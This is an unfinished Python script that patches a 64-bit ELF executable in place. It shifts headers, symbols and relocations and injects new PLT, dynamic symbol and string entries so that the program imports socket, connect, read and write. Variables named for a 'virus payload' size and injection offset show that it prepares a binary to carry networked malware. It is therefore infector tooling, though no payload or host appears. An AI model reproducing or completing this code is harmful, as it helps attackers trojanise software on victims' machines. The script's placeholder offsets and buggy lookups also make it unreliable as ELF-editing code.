#write
#strlen
#__stack_chk_fail
#htons
#memset
#close
#read
#gethostbyname
#memcpy
#connect
#socket

from elftools import *
from elftools.elf.elffile import ELFFile
from elftools.elf.enums import ENUM_D_TAG_COMMON
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from iced_x86 import *
import os
import array
import unittest

# Initialize the Capstone disassembler
md = Cs(CS_ARCH_X86, CS_MODE_64)

modifications = [] # contains 
offsets = [] # offsets of what to change

def modify_file(original_file,offset,data):
    original_file.seek(offset)
    original_file.write(data)

def edit_elf_section(elf_object,original_file,elf_section,section_index,size):   
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_offset_offset = 24
    section_addr_offset = 16
    total_section_addr_offset = section_header_table + section_header_size * section_index + section_addr_offset
    total_section_offset_offset = section_header_table + section_header_size * section_index + section_offset_offset
    section_offset = elf_section['sh_offset'] 
    section_addr = elf_section['sh_addr']
    #if section_index == 11:
    #print("Section",section_index ,"increase offset by",hex(size))
    #changing offset
    modify_file(original_file,total_section_offset_offset,(size + section_offset).to_bytes(8,'little'))
    #changing virtual address
    modify_file(original_file,total_section_addr_offset,(size + section_addr).to_bytes(8,'little'))

def get_indices_of_sections(elf_object,sections):
    indices = []
    for i in range(len(sections)):
        indices.append(elf_object.get_section_index(sections[i]))
    return indices

def get_total_increased_offset(indices,index,sizes):
    size = 0
    for j in range(len(indices)):
        if index > indices[j]:
            size+=sizes[j]
    return size

def get_total_increased_offset2(indices,index,sizes):
    size = 0
    for j in range(len(indices)):
        if index > indices[j]:
            size+=sizes[j]
    return size

def edit_elf_sections(elf_object,original_file,sections,sizes):
    """ Edits all sections by size after section
    """
    indices = get_indices_of_sections(elf_object,sections)
    for i in range(elf_object.num_sections()):
        size = get_total_increased_offset(indices,i,sizes)
        edit_elf_section(elf_object,original_file,elf_object.get_section(i),i,size)

def edit_text_size(elf_object,original_file,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    text_index = 16
    text_section = elf_object.get_section_by_name(".text")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))

def get_program_header_size_ammount(indices,offset,p_header_size,section_sizes):
    total_size = 0
    for i in range(len(indices)):
        if indices[i] >= offset and indices[i] < offset + p_header_size:
            total_size+=section_sizes[i]
    return total_size
    

def edit_program_header(elf_object,original_file,inject_offsets,sizes):
    program_header_offset = elf_object['e_phoff']
    num_segments = elf_object.num_segments()
    offset_offset = 8
    filesz_offset = 32
    memsz_offset = 40
    virtual_offset = 16
    physical_offset = 24
    header_size = elf_object['e_phentsize']
    for i in range(num_segments):
        segment = elf_object.get_segment(i)

        seg_size = get_program_header_size_ammount(inject_offsets,segment['p_offset'],segment['p_filesz'],sizes)
        if i == 2:
            print("seg_size",hex(seg_size))
        modify_file(original_file,program_header_offset + i * header_size + filesz_offset,(segment['p_filesz']+seg_size).to_bytes(8,'little'))
        modify_file(original_file,program_header_offset + i * header_size + memsz_offset,(segment['p_memsz']+seg_size).to_bytes(8,'little'))
        #if segment['p_offset'] > inject_offset:
        size = get_total_increased_offset(inject_offsets,segment['p_offset'],sizes)
        segment_offset = program_header_offset + i * header_size
        modify_file(original_file,segment_offset + offset_offset,(segment['p_offset']+size).to_bytes(8,'little'))
        modify_file(original_file,segment_offset + virtual_offset,(segment['p_vaddr']+size).to_bytes(8,'little'))
        modify_file(original_file,segment_offset + physical_offset,(segment['p_paddr']+size).to_bytes(8,'little'))


def edit_text_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    text_index = 16
    text_section = elf_object.get_section_by_name(".text")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))


    program_header_offset = elf_object['e_phoff']
    num_segments = elf_object.num_segments()
    filesz_offset = 32
    memsz_offset = 40
    filesz_offset = 32
    memsz_offset = 40
    header_size = elf_object['e_phentsize']
    for i in range(num_segments):
        segment = elf_object.get_segment(i)
        start = segment['p_offset']
        end = start + segment['p_filesz']
        if inject_offset >= start and inject_offset < end:
            modify_file(original_file,program_header_offset + i * header_size + filesz_offset,(segment['p_filesz']+size).to_bytes(8,'little'))
            modify_file(original_file,program_header_offset + i * header_size + memsz_offset,(segment['p_memsz']+size).to_bytes(8,'little'))



def edit_symbol_table(elf_object,original_file,inject_offsets,sizes):
    value_offset = 8
    sym_tab = elf_object.get_section_by_name(".symtab")
    sym_tab_offset = sym_tab['sh_offset']
    sym_size = 24
    num_symbols = sym_tab.num_symbols()


    for i in range(num_symbols):
        sym = sym_tab.get_symbol(i)['st_value']
        size = get_total_increased_offset(inject_offsets,sym,sizes)
        #if (sym > inject_offset):
        modify_file(original_file,sym_tab_offset + sym_size * i + value_offset,(sym+size).to_bytes(8,'little'))

def edit_dynamic_section(elf_object,original_file,inject_offsets,sizes):
    dynamic_section_entry_size = 16
    dynamic_section_offset = elf_object.get_section_by_name(".dynamic")['sh_offset']
    #print(dynamic_section_offset)
    dynamic_section = elf_object.get_section_by_name(".dynamic")
    max_common_tag = 0xf00000006ffffff9
    value_offset = 8
    for i in range(dynamic_section.num_tags()):
        tag = dynamic_section._get_tag(i)
        tag_value = tag['d_ptr']
        d_tag = tag['d_tag']
        #print(tag)
        #print(tag_value)
        #print(d_tag)
        if (tag['d_tag'] == 'DT_NULL'):
            continue
        if (ENUM_D_TAG_COMMON[tag['d_tag']] < max_common_tag): #and tag_value > inject_offset):
            size = get_total_increased_offset(inject_offsets,tag_value,sizes)
            modify_file(original_file,dynamic_section_offset + dynamic_section_entry_size * i + value_offset,(tag_value+size).to_bytes(8,'little'))

def edit_rela_dyn_section(elf_object,original_file,inject_offsets,sizes):
    rela_dyn_section = elf_object.get_section_by_name(".rela.dyn")
    rela_dyn_section_offset = elf_object.get_section_by_name(".rela.dyn")['sh_offset']
    rela_dyn_relo_size = 24
    rela_dyn_num_relocations = rela_dyn_section.num_relocations()
    relative_type = 8
    for i in range(rela_dyn_num_relocations):
        if rela_dyn_section.get_relocation(i)['r_info'] != relative_type:
            continue
        rela_dyn_offset = rela_dyn_section.get_relocation(i)['r_offset']
        size = get_total_increased_offset(inject_offsets,rela_dyn_offset,sizes)
        modify_file(original_file,rela_dyn_section_offset + i * rela_dyn_relo_size,(rela_dyn_offset+size).to_bytes(8,'little'))

def offset_in_rela(elf_object,offset):
    rela_dyn_section = elf_object.get_section_by_name(".rela.dyn")
    rela_dyn_num_relocations = rela_dyn_section.num_relocations()
    relative_type = 8

    rela_plt_section = elf_object.get_section_by_name(".rela.plt")
    rela_plt_num_relocations = rela_plt_section.num_relocations()

    for i in range(rela_dyn_num_relocations):
        if offset == rela_dyn_section.get_relocation(i)['r_offset'] and rela_dyn_section.get_relocation(i)['r_info'] != relative_type:
            return True
    for i in range(rela_plt_num_relocations):
        if offset == rela_plt_section.get_relocation(i)['r_offset']:
            return True
    return False


def edit_code_section(elf_object,original_file,section_offset,section_size,inject_offset,size):
    start = section_offset
    end = section_offset + section_size

    original_file.seek(start)  # Move the file pointer to the starting offset
    code = original_file.read(end - start)
    decoder = Decoder(64, code, ip=start)
    formatter = Formatter(FormatterSyntax.NASM)
    for instr in decoder:
        disasm = formatter.format(instr)
        rel_mem = instr.ip_rel_memory_address
        next_ip = instr.ip + instr.len

        operand = rel_mem - next_ip
        instruction_length = instr.len
        start_index = instr.ip
        end_index = start_index + instruction_length
        instruction_bytes = code[start_index-start:end_index-start]
        if ((instr.ip < inject_offset < rel_mem) or (rel_mem < inject_offset < instr.ip)) and rel_mem < os.path.getsize(original_file.name) and not offset_in_rela(elf_object,rel_mem):
            searching_bytes = operand.to_bytes(4, byteorder='little',signed=True)
            hex_code = ' '.join(f'{byte:02X}' for byte in instruction_bytes)
            hex_bytes = bytes.fromhex(hex_code)
            try:
                instruction_offset = instr.ip + hex_bytes.index(searching_bytes)
            except:
                continue
            modify_file(original_file,instruction_offset,(rel_mem - next_ip + size if instr.ip < inject_offset < rel_mem else rel_mem - next_ip - size).to_bytes(4,'little',signed=True))
            #print(hex(instr.ip),"|",disasm,hex(rel_mem),"|"," Next instruction: ",hex(next_ip),"|"," Operand ",hex(rel_mem - next_ip)," | Memory offset",hex(instruction_offset)," | Hex Code: ",hex_code)

def edit_text_section_calls(elf_object,original_file,inject_offset,size):
    modify_file(original_file,0x11a4,(0xc9).to_bytes(1,'little'))
    for i in range(elf_object.num_segments()):
        if elf_object.get_segment(i)['p_flags'] & 0x1 == 1:
            offset = elf_object.get_segment(i)['p_offset']
            end = offset + elf_object.get_segment(i)['p_filesz']
            for i in range(elf_object.num_sections()):
                if elf_object.get_section(i)['sh_offset'] >= offset and elf_object.get_section(i)['sh_offset'] < end:
                    edit_code_section(elf_object,original_file,elf_object.get_section(i)['sh_offset'],elf_object.get_section(i)['sh_size'],inject_offset,size)






import array

# Function to read an ELF file as bytes
def read_elf_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

# Function to write bytes to an ELF file
def write_elf_file(data, file_path):
    with open(file_path, 'wb') as file:
        file.write(data)

# Function to insert bytes at a specified offset in an ELF file
def insert_bytes_in_elf(elf_bytes, offset, bytes_to_insert):
    elf_bytearray = bytearray(elf_bytes)
    
    # Check if the offset is within the ELF file
    if offset >= len(elf_bytearray):
        raise ValueError(f"Offset {offset} is out of bounds for the ELF file.")
    
    # Insert the bytes at the specified offset
    elf_bytearray[offset:offset] = bytes_to_insert
    
    return bytes(elf_bytearray)

sym_versions = [2,2,2,4,2,2,3,2,2,0]
symbol_names = [  "memset", "close", "read", "memcpy","connect","socket", "__stack_chk_fail","write","strlen"]
GLIBC_versions = ["GLIBC_2.14","GLIBC_2.4"]
string_names = [ "memset", "close", "read", "memcpy","connect","socket", "__stack_chk_fail","write","strlen","GLIBC_2.14","GLIBC_2.4"]
str_tab_entries = []

def convert_functions_to_str_tab_entry():
    str_tab_entries.clear()
    for symbol in string_names:
        for letter in symbol:
            str_tab_entries.append(ord(letter))
        str_tab_entries.append(0x0)
    while len(str_tab_entries) % 16 != 0:
        str_tab_entries.append(0x0)


def get_str_index_of_str(offset,str_name):
    sym_name_index = string_names.index(str_name)
    index = offset
    for i in range(sym_name_index):
        index = index + len(string_names[i]) + 1
    return index

def add_versions_to_gnu_version(elf_object,file,offset,size):
    sizes = []
    for i in sym_versions:
        sizes.append(2)
    assert sum(sizes) == size, "Values are not equal"
    add_contents_to_file(offset,file,sym_versions,sizes)


def add_strings_to_dyn_str_tab(elf_object,file,offset,size):
    sizes = []
    for i in str_tab_entries:
        sizes.append(1)
    assert sum(sizes) == size, "Values are not equal"
    add_contents_to_file(offset,file,str_tab_entries,sizes)

def add_functions_to_sym_tab(elf_object,file,size):
    section = elf_object.get_section_by_name(".symtab")
    offset = section['sh_offset'] + section['sh_size']
    sizes = [4,1,1,2,8,8]
    assert sum(sizes) * len(symbol_names) == size, "values are not equal"
    for i in range(len(symbol_names)):
        name = 0x0
        #print(hex(offset))
        add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],sizes)
        offset+= section['sh_entsize']
        

def add_contents_to_file(offset,file,array_contents,array_sizes):
    for i in range(len(array_contents)):
        elf_bytes = read_elf_file('hello')
        modified_elf_bytes = insert_bytes_in_elf(elf_bytes, offset, array_contents[i].to_bytes(array_sizes[i],'little'))
        offset+=array_sizes[i]
        # Write the modified ELF bytes back to the file
        write_elf_file(modified_elf_bytes, 'hello')


def check_duplicate_symbols(elf_object):
    value_offset = 8
    dyn_sym_tab = elf_object.get_section_by_name(".dynsym")
    dyn_sym_offset = dyn_sym_tab['sh_offset']
    dyn_sym_size = 24
    num_symbols = dyn_sym_tab.num_symbols()
    for i in range(num_symbols):
        #print(i,sym_tab.get_symbol(i)['st_info'])
        if dyn_sym_tab.get_symbol(i).name in symbol_names:
            del sym_versions[(symbol_names.index(dyn_sym_tab.get_symbol(i).name))]
            symbol_names.remove(dyn_sym_tab.get_symbol(i).name)
            string_names.remove(dyn_sym_tab.get_symbol(i).name)
    #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)

def add_functions_to_dyn_sym(elf_object,file,offset,size,dyn_str_inject_offset):
    #section = elf_object.get_section_by_name(".dynsym")
    #offset = section['sh_offset'] + section['sh_size']
    sizes = [4,1,1,2,8,8]
    entry_size = 0x18
    print("dyn_str_inject_offset")
    print(len(symbol_names) * sum(sizes),size)
    assert len(symbol_names) * sum(sizes) == size, "values not equal"
    for i in range(len(symbol_names)):
        name = get_str_index_of_str(dyn_str_inject_offset,symbol_names[i])
        print("Name:",hex(name))
        #print(hex(offset))
        add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],sizes)
        offset+= entry_size

def get_index_of_symbol_in_dyn_sym(symbol_name):
    if symbol_name in dyn_sym_symbol_names:
        return dyn_sym_symbol_names.index(symbol_name)
    return len(dyn_sym_symbol_names) + symbol_names.index(symbol_name)

def add_functions_to_rela_plt(elf_object,file,offset,size):
    section = elf_object.get_section_by_name(".rela.plt")
    #for i in range(section.num_relocations()):
        #print(section.get_relocation(i))
    #offset = section['sh_offset'] + section['sh_size']
    print("RELA PLT OFFSET:",hex(offset))
    sizes = [8,8,8]
    assert sum(sizes) * len(symbol_names) == size, "values not equal"
    for i in range(len(symbol_names)):
        index = get_index_of_symbol_in_dyn_sym(symbol_names[i])
        info = index * 0x100000000 + 0x7
        rela_offset = 0x3cf8 # PLACEHOLDER FOR LATER
        add_contents_to_file(offset,file,[0,info,0x0],sizes)
        print('added')
        offset+= section['sh_entsize']

def add_versions_to_gnu_version_r(elf_object,file,inject_offset,gnu_version_r_offset,dyn_str_inject_offset,size):
    #modify_file(file,gnu_version_r_offset,(gnu_version_r_section_size+size).to_bytes(8,'little'))
    verneed_size = 16
    GLIBC_2_14_name = get_str_index_of_str(dyn_str_inject_offset,GLIBC_versions[0])
    GLIBC_2_4_name = get_str_index_of_str(dyn_str_inject_offset,GLIBC_versions[1])
    print("NAMES: ",GLIBC_2_14_name,GLIBC_2_4_name)
    name = 0x0
    flags = 0x0
    next = 0x10
    sizes = [4,2,2,4,4]
    GLIBC_2_14 = [0x06969194,flags,0x4,GLIBC_2_14_name,next]
    GLIBC_2_4 =  [0x0d696914,flags,0x3,GLIBC_2_4_name,next]

    assert sum(sizes) * 2 == size, "values not equal"
        
    add_contents_to_file(inject_offset,file,GLIBC_2_14,sizes)
    add_contents_to_file(inject_offset+verneed_size,file,GLIBC_2_4,sizes)

def edit_gnu_version_r_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    gnu_version_r_index = elf_object.get_section_index(".gnu.version_r")
    gnu_version_r_section = elf_object.get_section_by_name(".gnu.version_r")
    gnu_version_r_section_size = gnu_version_r_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * gnu_version_r_index + section_size_offset
    modify_file(original_file,total_section_size_offset,(gnu_version_r_section_size+size).to_bytes(8,'little'))

    gnu_version_r_section = elf_object.get_section_by_name(".gnu.version_r")
    num_versions = gnu_version_r_section.num_versions()
    print("Num versions", num_versions)
    additional_versions = 2
    cnt_offset = 2

    modify_file(original_file,gnu_version_r_offset+cnt_offset,(num_versions+additional_versions).to_bytes(2,'little'))

def edit_gnu_version_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    gnu_version_index = elf_object.get_section_index(".gnu.version")
    gnu_version_section = elf_object.get_section_by_name(".gnu.version")
    gnu_version_section_size = gnu_version_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * gnu_version_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(gnu_version_section_size+size).to_bytes(8,'little'))

dyn_sym_symbol_names = []
## size of got = 8 * (num rela.dyn + num rela.plt)
## size of .plt = 16 * (num rela.plt) + 16

def edit_got_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    got_index = elf_object.get_section_index('.got')
    got_section = elf_object.get_section_by_name("got")

    got_section_size = got_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * got_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(got_section_size+size).to_bytes(8,'little'))


def add_functions_to_plt_sec(elf_object,file,offset,size):
    sizes = [4,3,4,5]
    assert sum(sizes) * len(symbol_names) == size, "values not equal"
    endbr64 = 0xfa1e0ff3
    jmp = 0x25fff2
    nopl = 0x0000441f0f
    for i in range(len(symbol_names)):
        jmp_offset = 0x0 # Need to change from 0x0
        add_contents_to_file(offset,file,[endbr64,jmp,jmp_offset,nopl],sizes)
        offset+= sum(sizes)

def edit_plt_sec_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    plt_sec_index = elf_object.get_section_index('.plt.sec')
    plt_sec_section = elf_object.get_section_by_name(".plt.sec")

    plt_sec_section_size = plt_sec_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * plt_sec_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(plt_sec_section_size+size).to_bytes(8,'little'))

def add_functions_to_plt(elf_object,file,offset,size,plt_offset,num_relocations_plt):
    sizes = [4,1,4,2,4,1]
    assert sum(sizes) * len(symbol_names) == size, "values not equal"
    endbr64 = 0xfa1e0ff3
    jmp = 0xe9f2
    nop = 0x90
    push = 0x68
    push_val = num_relocations_plt
    jmp_offset = 0xffffffe1 - 16 * push_val
    for i in range(len(symbol_names)):
        add_contents_to_file(offset,file,[endbr64,push,push_val,jmp,jmp_offset,nop],sizes)
        offset+= sum(sizes)
        push_val = push_val + 1
        jmp_offset = jmp_offset - 16

def edit_plt_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    plt_index = elf_object.get_section_index('.plt')
    plt_section = elf_object.get_section_by_name(".plt")

    plt_section_size = plt_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * plt_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(plt_section_size+size).to_bytes(8,'little'))



def edit_dyn_sym_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    dyn_sym_index = elf_object.get_section_index('.dynsym')
    dyn_sym_section = elf_object.get_section_by_name(".dynsym")

    dyn_sym_section_size = dyn_sym_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * dyn_sym_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(dyn_sym_section_size+size).to_bytes(8,'little'))



def edit_rela_plt_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    rela_plt_index = elf_object.get_section_index('.rela.plt')
    rela_plt_section = elf_object.get_section_by_name(".rela.plt")
    rela_plt_section_size = rela_plt_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * rela_plt_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(rela_plt_section_size+size).to_bytes(8,'little'))

def edit_sym_tab_section(elf_object,original_file,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    sym_tab_index = elf_object.get_section_index('.symtab')
    sym_tab_section = elf_object.get_section_by_name(".symtab")
    sym_tab_section_size = sym_tab_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * sym_tab_index + section_size_offset
    #print(hex(text_section_size))

    modify_file(original_file,total_section_size_offset,(sym_tab_section_size+size).to_bytes(8,'little'))


def edit_dyn_str_section(elf_object,original_file,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    dyn_str_index = elf_object.get_section_index('.dynstr')
    dyn_str_section = elf_object.get_section_by_name(".dynstr")
    dyn_str_section_size = dyn_str_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * dyn_str_index + section_size_offset
    #print(hex(text_section_size))

    modify_file(original_file,total_section_size_offset,(dyn_str_section_size+size).to_bytes(8,'little'))

virus_payload_size = 0x2fe
virus_payload_inject_offset = 0x1169

size = 16 #for hello
size = virus_payload_size

f = open('hello','r+b')
elf = ELFFile(open('hello','rb'))
inject_offset = 0x1194 # for hello
inject_offset = virus_payload_inject_offset

#modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))

#edit_text_section_calls(elf,f,inject_offset,size)

#edit_text_section(elf,f,inject_offset,size)
#edit_elf_sections( elf,f,'.text',size)
#edit_symbol_table(elf,f,inject_offset,size)
#edit_program_header(elf,f,inject_offset,size)
#edit_dynamic_section(elf,f,inject_offset,size)
#edit_rela_dyn_section(elf,f,size)

##### Testing

"""print('sh_link',elf.get_section(6)['sh_link'])
section = elf.get_section(6)
for i in range(section.num_symbols()):
    print(section.get_symbol(i)['st_name'])"""



########


check_duplicate_symbols(elf)
convert_functions_to_str_tab_entry()

dyn_sym_section = elf.get_section_by_name(".dynsym")
for i in range(dyn_sym_section.num_symbols()):
    dyn_sym_symbol_names.append(dyn_sym_section.get_symbol(i).name)
print(dyn_sym_symbol_names)


#.plt.sec
section = elf.get_section_by_name(".plt.sec")
plt_sec_inject_offset = section['sh_offset'] + section['sh_size']
plt_sec_entry_size = section['sh_entsize']
plt_sec_size = len(symbol_names) * plt_sec_entry_size
plt_sec_offset = section['sh_offset']
#.plt
section = elf.get_section_by_name(".plt")
plt_inject_offset = section['sh_offset'] + section['sh_size']
plt_entry_size = section['sh_entsize']
plt_offset = section['sh_offset']
plt_size = len(symbol_names) * plt_entry_size
plt_num_relocations = elf.get_section_by_name(".rela.plt").num_relocations()


#.gnu.version
section = elf.get_section_by_name(".gnu.version")
gnu_version_inject_offset = section['sh_offset'] + section['sh_size']
gnu_version_size = len(sym_versions) * 2
#.gnu.version_r
section = elf.get_section_by_name(".gnu.version_r")
gnu_version_r_header_size = 16
gnu_version_r_inject_offset = section['sh_offset'] + gnu_version_r_header_size
gnu_version_r_size = 32 #NEED TO CHANGE THIS
#.symtab
section = elf.get_section_by_name(".symtab")
if section is not None:
    sym_tab_inject_offset = section['sh_offset'] + section['sh_size'] #where the end of symble table is
if section is not None:
    sym_tab_size = len(symbol_names) * section['sh_entsize'] #size of functions of add
if section is not None:
    sym_tab_offset = section['sh_offset']
#.rela.plt
section = elf.get_section_by_name(".rela.plt")
rela_plt_inject_offset = section['sh_offset'] + section['sh_size']
rela_plt_size = len(symbol_names) * section['sh_entsize']
#.dynsym
section = elf.get_section_by_name(".dynsym")
dyn_sym_inject_offset = section['sh_offset'] + section['sh_size']
dyn_sym_size = len(symbol_names) * section['sh_entsize']
print("DYN_SYM_SIZE",dyn_sym_size)
#.dynstr
section = elf.get_section_by_name(".dynstr")
dyn_str_inject_offset = section['sh_offset'] + section['sh_size']
dyn_str_size = len(str_tab_entries)
print("dyn_str_inject_size: ",dyn_str_size)
rela_plt_offset = elf.get_section_by_name(".rela.plt")['sh_offset']
dyn_sym_offset = elf.get_section_by_name(".dynsym")['sh_offset']
dyn_str_offset = elf.get_section_by_name(".dynstr")['sh_offset']
gnu_version_offset = elf.get_section_by_name(".gnu.version")['sh_offset']
gnu_version_r_offset = elf.get_section_by_name(".gnu.version_r")['sh_offset']

section_offsets = [sym_tab_offset,plt_sec_offset,plt_offset,rela_plt_offset,gnu_version_r_offset,gnu_version_offset,dyn_str_offset,dyn_sym_offset]
elf_sections_changes = ['.symtab','.plt.sec','.plt','.rela.plt','.gnu.version_r','.gnu.version','.dynstr','.dynsym']
elf_sections_changes_sizes = [sym_tab_size,plt_sec_size,plt_size,rela_plt_size,gnu_version_r_size,gnu_version_size,dyn_str_size,dyn_sym_size]
inject_offsets = [sym_tab_inject_offset,plt_sec_inject_offset,plt_inject_offset,rela_plt_inject_offset,gnu_version_r_inject_offset,gnu_version_inject_offset,dyn_str_inject_offset,dyn_sym_inject_offset]
print("SECTIONS",elf_sections_changes)
print("SIZES",elf_sections_changes_sizes)
print("SECTION OFFSETS",section_offsets)
print("INJECT OFFSETS",inject_offsets)
edit_symbol_table(elf,f,inject_offsets,elf_sections_changes_sizes)
edit_program_header(elf,f,section_offsets,elf_sections_changes_sizes)
edit_dynamic_section(elf,f,section_offsets,elf_sections_changes_sizes)
edit_rela_dyn_section(elf,f,inject_offsets,elf_sections_changes_sizes)
edit_elf_sections(elf,f,elf_sections_changes,elf_sections_changes_sizes)


edit_sym_tab_section(elf,f,sym_tab_size)
edit_plt_sec_section(elf,f,plt_sec_inject_offset,plt_sec_size)
edit_plt_section(elf,f,plt_inject_offset,plt_size)
edit_rela_plt_section(elf,f,inject_offsets,rela_plt_size)
edit_gnu_version_r_section(elf,f,inject_offsets,gnu_version_r_size)
edit_gnu_version_section(elf,f,inject_offsets,gnu_version_size)
edit_dyn_str_section(elf,f,dyn_str_size)
edit_dyn_sym_section(elf,f,inject_offsets,dyn_sym_size)
modify_file(f,40,(elf['e_shoff']+sum(elf_sections_changes_sizes)).to_bytes(8,'little'))
print("Num symbols to add ",len(symbol_names))
#dyn_sym_size = elf.get_section_by_name(".dynsym")['sh_entsize']
#dyn_sym_offset = elf.get_section_by_name(".dynsym")['sh_offset'] + elf.get_section_by_name(".dynsym")['sh_size']

add_functions_to_sym_tab(elf,f,sym_tab_size)
add_functions_to_plt_sec(elf,f,plt_sec_inject_offset,plt_sec_size)
add_functions_to_plt(elf,f,plt_inject_offset,plt_size,plt_offset,plt_num_relocations)
add_functions_to_rela_plt(elf,f,rela_plt_inject_offset,rela_plt_size)
add_versions_to_gnu_version_r(elf,f,gnu_version_r_inject_offset,gnu_version_r_offset,dyn_str_inject_offset-dyn_str_offset,gnu_version_r_size)
add_versions_to_gnu_version(elf,f,gnu_version_inject_offset,gnu_version_size)
add_strings_to_dyn_str_tab(elf,f,dyn_str_inject_offset,dyn_str_size)
add_functions_to_dyn_sym(elf,f,dyn_sym_inject_offset,dyn_sym_size,dyn_str_inject_offset-dyn_str_offset)






#### testing
"""elf = ELFFile(open('hello','rb'))
print('sh_link',elf.get_section(6)['sh_link'])
section = elf.get_section(6)
for i in range(section.num_symbols()):
    print(section.get_symbol(i)['st_name'])"""

"""section = elf.get_section_by_name(".rela.plt")
inject_offset = section['sh_offset'] + section['sh_size']
size = len(symbol_names) * section['sh_entsize']

edit_elf_sections( elf,f,'.rela.plt',size)
edit_symbol_table(elf,f,inject_offset,size)
edit_program_header(elf,f,inject_offset,size)
edit_dynamic_section(elf,f,inject_offset,size)
edit_rela_dyn_section(elf,f,size)


edit_rela_plt_section(elf,f,inject_offset,size)

modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))

add_functions_to_rela_plt(elf,f)"""